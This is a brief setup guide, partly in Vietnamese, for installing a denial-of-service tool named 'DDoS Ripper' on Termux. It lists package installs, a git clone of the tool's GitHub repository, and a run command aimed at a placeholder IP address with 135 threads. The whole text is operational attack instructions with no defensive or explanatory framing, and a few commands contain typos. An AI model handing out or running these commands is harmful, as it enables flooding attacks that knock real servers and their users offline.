    TOOL DDOS RIPPER

    pkg installgit -y

    pkg install python -y

    pkg install python3 -y

    git clone https://github.com/palahsu/DDoS-Ripper.git

    cd DDoS-Ripper $ ls

    $ python3 DRipper.py

    Lệnh Chạy
    python3 DRipper.py -s [ip Address] -t 135
